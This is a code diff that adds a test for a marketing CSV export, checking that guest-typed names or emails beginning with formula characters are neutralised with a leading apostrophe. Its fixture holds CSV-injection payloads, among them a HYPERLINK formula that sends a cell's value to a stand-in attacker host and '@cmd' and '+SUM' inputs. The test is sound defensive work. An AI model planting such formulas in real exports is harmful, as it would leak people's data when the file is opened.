@@ -28,6 +28,24 @@ describe("the second filter", () => {
     expect(csv).toContain("ana@example.com");
     expect(csv).not.toContain("bo@example.com");
   });
+  it("a guest-typed formula in a name or email cannot run when the list is opened in a spreadsheet (W12/B069)", () => {
+    const { csv } = marketingCsv([
+      { ...row("1", "-x@example.com"), first_name: '=HYPERLINK("https://evil.example/?"&A2,"View")', last_name: "+SUM(1)" },
+      { ...row("2", "ana@example.com"), first_name: "@cmd", last_name: "\tTab" },
+      row("3", "bo@example.com"),
+    ]);
+    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?""&A2,""View"")"`);
+    expect(csv).toContain("'+SUM(1)");
+    expect(csv).toContain("'-x@example.com");
+    expect(csv).toContain("'@cmd");
+    const lines = csv.replace(/^﻿/, "").trimEnd().split("\r\n").slice(1);
+    for (const l of lines) {
+      const cells = l.match(/("([^"]|"")*"|[^,]*)(,|$)/g)!.map((c) => c.replace(/,$/, "").replace(/^"|"$/g, ""));
+      for (const c of cells) expect(c).not.toMatch(/^[=+\-@\t\r]/);
+    }
+    // A clean row is byte-identical to before.
+    expect(lines[2]).toBe("bo@example.com,A,B,2026-10-01T04:00:00Z,toast_csv_import");
+  });
 });
 
 describe("Meta customer file", () => {
